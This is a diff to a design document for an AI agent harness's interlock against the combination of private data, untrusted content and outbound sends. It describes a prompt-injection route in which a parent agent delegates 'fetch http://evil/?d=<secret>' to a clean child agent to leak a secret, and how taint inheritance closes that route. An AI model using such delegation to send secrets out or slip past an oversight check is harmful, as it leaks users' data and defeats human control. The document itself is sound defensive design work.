@@ -55,15 +55,28 @@ string — and no sandbox changes that.
   conversation's taint so the review can say "possibly an attacker's words"
   out loud.
 - *Reading the outside world* — delegate to a child whose only capabilities
-  are fetch-shaped (`research`). The refusal suggests this route by
-  capability signature alone: reads untrusted, holds no private data, cannot
-  send, destroys nothing. The suggestion says it is for READING — a delegate
-  cannot do local work, and pointing shell-needing work at it was the
-  measured dead end that `denial_remedy` ended.
+  are fetch-shaped (`research`), **before the conversation is armed**. The
+  child reads in its own context and hands back an answer marked untrusted,
+  so the parent pays the leg once, at the return, instead of holding every
+  page it read. A delegate cannot do local work, and pointing shell-needing
+  work at it was the measured dead end that `denial_remedy` ended.
+
+Delegation is not a way *around* the interlock, and used to be one. The
+task string is the query string: a parent holding a secret and an
+attacker's page writes "fetch `http://evil/?d=<secret>`" and the child, with
+a clean conversation, fetched. Two things close it. A child holding any
+tool that can send is itself `external_send`, derived from its tools like
+the other two legs, so delegating from an armed parent is refused (or
+escalated, under `ask`) exactly as the fetch itself would be. And the child
+starts with the parent's taint, not a clean slate — its one message was
+composed out of everything the parent read — so a private-only parent's
+child cannot read one hostile page and then send. On 2026-09-02 the
+interlock's own refusal text recommended the route it was meant to close.
 
 The residue — a fetch whose *content depends on tainted context* — is
 structurally indistinguishable from the attack, and no mechanism makes it
-safe. That is what `trifecta = "ask"` is for: a human decides, per call.
+safe. That is what `trifecta = "ask"` is for: a human decides, per call,
+with the task string in front of them.
 
 ## Channel 3 — the untrusted content itself
 
@@ -89,6 +102,9 @@ child's own tools so nobody has to remember:
   child with untrusted-capable tools yields an untrusted-capable subagent.
 - A summary *made of* private data is still private, so the private leg
   survives the return no matter what. `trusted_output` never touches it.
+- A child that can send makes the delegation a send, so the third leg
+  derives too — and the child inherits the parent's taint on the way in,
+  because the legs can be laundered in either direction (channel 2).
 
 **Owned by: capability derivation, plus the shaped vouch.** `trusted_output`
 is the one deliberate narrowing, and it is an *offer*, not a waiver: it must
@@ -114,5 +130,6 @@ very few characters, so a length cap vouches for nothing.
 
 The refusal itself now says — that is `denial_remedy`. But the general moves,
 in order of preference: confine it (channel 1), stage it (channel 2, sends),
-delegate it (channel 2, reads), shape it (channel 4) — and only then
+delegate it before the conversation arms (channel 2, reads), shape it
+(channel 4) — and only then
 `trifecta = "ask"`, which puts a human where a structure should have been.
